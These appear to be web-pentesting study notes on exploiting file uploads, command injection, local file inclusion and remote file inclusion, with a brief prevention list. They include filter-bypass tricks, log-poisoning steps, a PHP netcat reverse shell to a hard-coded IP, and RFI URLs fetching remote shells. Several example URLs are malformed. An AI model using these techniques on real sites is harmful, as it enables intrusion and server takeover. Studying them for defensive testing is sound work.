### File uploads :

- Check the website for the feature of uploading files

- Test the uploading feature with the expected file type

- Try uploading a different type of file and see the output of the process

- Upload a shell to the application . __The shell has to be inthe same langugae the website is coded in__


__Tools can be used__


- __Weavely:__ generates a php payloads 

&nbsp;
__Advanced Fileuploads___

- Upload the allowable file to the web and intercept with the required file. [tampering the header]

- To bypass the file extension filter, add the jpg or any allowable exentensions at the end of the shell EX:" shell.php.jpg


__Prevenntion__

- Check for the type of file 

- Check foe the extension of the file 

- Analyze the contents of the file and recreate them 

&nbsp;
&nbsp;
### Code Execution:

- Test the website by submitting simple command as __ls__ for linux and __dir__ for windows , if it executes, it means that there is code execution vulnerability

- use semi-colod __;__ to separate the commands __EX: https:www.//site.com/index.php; ls__

- If the above command did not do anything, it could be as a result of command filtering on the applcation.

- Sometimes the semicolon does not work, piping __|__ might work work to separate the commands __EX: https:www.//site.com/index.php | ls__

&nbsp;
&nbsp;
### Local File Inclusion:

-  is an exploit that allows attacker to browser any file on the server

- Discovering type of vulnerability would be trhough browsing or spidering the web application, EX: www.ste.com/?page=iclude.php

  The URL shows that there a page is begining called with the paging URl == __?page=inlcude.php__

- Exploiting this vulnerability would be through going back into the root directory and look for important files 

- It is important to note that having many path traversal won't affect the validity of the url :

  For example : if the path to the root directory is 3 ../../../ path traversal , putting 5 won't effect the vaility of the path, you can still access the root directory. Therefore, always include more ../ to ensure getting to the root directory
  
&nbsp;  
__Advanced Technique for LFI__

- In advanced techniques for LFI, a tampering the head of the request is one of the essential thigs.

- User-agents, language and Accept can be modified through BurpSuite include the required shell commnads

__Ex: <?phpinfo();?>__ 

- __Shell Example:__ 

__<?passthru('nc -e /bin/sh 10.25.26.74 6666');?>__

- The above shell exploited the local innlusion vulnerability and use it to get access to the whole application 

&nbsp;
__Ex:Injectablable paths__

- Try to inject one of the below paths. If it runs means you can execute a shell on the application

    >> /proc/self/environ
    
    >> /var/log/auth.log &nbsp; | auth.log is a log file that contains all the authentication attempts to the server
    
    >> /var/log/apache2/access.log
    
 
 ### Remote File Inclusion:
 
 - The exploiting allows the attacker to call the shell file remote to execute on the application 
 

- It is important to note that when saving the payload or shell is to save it as txt file instead of anyother extension to enbale the 
  excution on the targeted web application. if attacker keeps it as php or py, the payload or shell will execute on the attacker machine   instead of the targeted machine

__Ex: https://www.site.com/?page=http://www.newsite.com/reverse.txt__

__Ex: https://www.site.com/?page=http://www.newsite.com/reverse.txt?__ | sometimes question mark__?__ is needed at the end of the link t   to execute as php


__Advanced Techniques:__


- Sometimes the application is using filters that pervernt http or forward slash from executing , try to play with the cased of the __http__

Ex: https://www.site.com/?page=HtTP://www.newsite.com/reverse.txt


